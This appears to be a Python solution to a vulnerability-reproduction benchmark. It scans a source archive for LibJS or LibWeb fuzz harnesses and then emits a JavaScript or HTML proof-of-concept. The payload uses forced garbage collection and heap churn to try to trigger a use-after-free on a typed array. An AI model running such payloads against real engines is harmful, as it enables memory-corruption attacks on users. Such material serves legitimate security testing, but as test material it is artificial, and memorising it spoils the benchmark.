import os
import tarfile
from typing import Optional


class Solution:
    def _detect_mode_from_tar(self, tar_path: str) -> str:
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                members = tf.getmembers()
                names = [m.name for m in members]

                for n in names:
                    ln = n.lower()
                    if "fuzz" in ln or "fuzzer" in ln:
                        if "libweb" in ln or "html" in ln or "dom" in ln:
                            return "html"
                        if "libjs" in ln or "js" in ln or "bytecode" in ln:
                            return "js"

                # Content-based heuristic: scan a small number of likely harness files.
                scanned = 0
                for m in members:
                    if scanned >= 60:
                        break
                    if not m.isfile():
                        continue
                    ln = m.name.lower()
                    if not (ln.endswith(".cpp") or ln.endswith(".cc") or ln.endswith(".cxx") or ln.endswith(".c")):
                        continue
                    if "fuzz" not in ln and "fuzzer" not in ln and "harness" not in ln:
                        continue
                    if m.size <= 0 or m.size > 2_000_000:
                        continue
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    data = f.read()
                    scanned += 1
                    if b"LLVMFuzzerTestOneInput" not in data:
                        continue
                    lower = data.lower()
                    if b"libweb" in lower or b"html" in lower or b"dom::" in lower or b"web::" in lower:
                        return "html"
                    if b"libjs" in lower or b"bytecode" in lower or b"js::" in lower:
                        return "js"
        except Exception:
            return "js"
        return "js"

    def _detect_mode_from_dir(self, root: str) -> str:
        hints = {"html": 0, "js": 0}
        for dirpath, dirnames, filenames in os.walk(root):
            low_dirpath = dirpath.lower()
            if "build" in low_dirpath or ".git" in low_dirpath:
                continue
            for fn in filenames:
                lfn = fn.lower()
                if not (lfn.endswith(".cpp") or lfn.endswith(".cc") or lfn.endswith(".cxx") or lfn.endswith(".c")):
                    continue
                path = os.path.join(dirpath, fn)
                lpath = path.lower()
                if "fuzz" in lpath or "fuzzer" in lpath or "harness" in lpath:
                    if "libweb" in lpath or "html" in lpath or "dom" in lpath:
                        hints["html"] += 3
                    if "libjs" in lpath or (os.sep + "js" + os.sep) in lpath or "bytecode" in lpath:
                        hints["js"] += 3
                    try:
                        if os.path.getsize(path) <= 2_000_000:
                            with open(path, "rb") as f:
                                data = f.read()
                            if b"LLVMFuzzerTestOneInput" in data:
                                lower = data.lower()
                                if b"libweb" in lower or b"html" in lower or b"dom::" in lower or b"web::" in lower:
                                    hints["html"] += 10
                                if b"libjs" in lower or b"bytecode" in lower or b"js::" in lower:
                                    hints["js"] += 10
                    except Exception:
                        pass

        if hints["html"] > hints["js"]:
            return "html"
        return "js"

    def _payload_js(self) -> str:
        return r"""(function(){
function force_gc(){
  for(let i=0;i<8;i++){
    try{ if(typeof gc==='function') gc(); }catch(e){}
    try{ if(typeof globalThis!=='undefined' && typeof globalThis.gc==='function') globalThis.gc(); }catch(e){}
    try{ if(typeof collectGarbage==='function') collectGarbage(); }catch(e){}
    try{ if(typeof internals!=='undefined' && internals && typeof internals.gc==='function') internals.gc(); }catch(e){}
    try{ if(typeof window!=='undefined' && window && typeof window.gc==='function') window.gc(); }catch(e){}
  }
}
function churn(count){
  let a=[];
  for(let i=0;i<count;i++) a.push(new ArrayBuffer(0x1000));
  return a;
}

for(let iter=0; iter<250; iter++){
  let u=null;

  if(typeof Uint8ClampedArray==='function'){
    let b=new ArrayBuffer(0x2000);
    u=new Uint8ClampedArray(b);
    u[0]=iter&255;
    b=null;
  } else if(typeof ImageData==='function'){
    let img=new ImageData(64,64);
    u=img.data;
    img=null;
  } else {
    return;
  }

  force_gc();
  let c=churn(512);
  c=null;
  force_gc();

  for(let j=0;j<64;j++){
    u[j]=(j*17+iter)&255;
  }
  let x=u[0];
  u[1]=x;
}
})();"""

    def _payload_html(self) -> str:
        js = self._payload_js()
        return "<!doctype html><meta charset=utf-8><script>\n" + js + "\n</script>\n"

    def solve(self, src_path: str) -> bytes:
        mode: Optional[str] = None
        if os.path.isdir(src_path):
            mode = self._detect_mode_from_dir(src_path)
        else:
            mode = self._detect_mode_from_tar(src_path)

        if mode == "html":
            payload = self._payload_html()
        else:
            payload = self._payload_js()

        return payload.encode("utf-8", errors="strict")